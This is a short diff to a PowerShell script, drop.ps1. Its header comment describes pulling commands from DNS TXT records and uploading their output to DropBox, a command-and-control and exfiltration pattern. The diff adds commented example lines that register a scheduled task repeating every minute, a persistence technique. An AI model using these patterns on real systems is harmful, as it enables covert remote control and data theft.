@@ -11,6 +11,12 @@
 # .\drop.ps1 -inmode dns    -record {record}    -outmode dbox   -token {token}      // get command from TXT DNS record and save the output on DropBox
 #
 
+#
+# $action = New-ScheduledTaskAction -Execute "calc.exe"
+# $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
+# Register-ScheduledTask -Action $act -Trigger $t -TaskPath "TEST" -TaskName "MyTask" -Description "Test Task"
+#
+
 Param (
     # define channel mode
     [Parameter(Mandatory=$true,HelpMessage="Command's source type is needed!")]
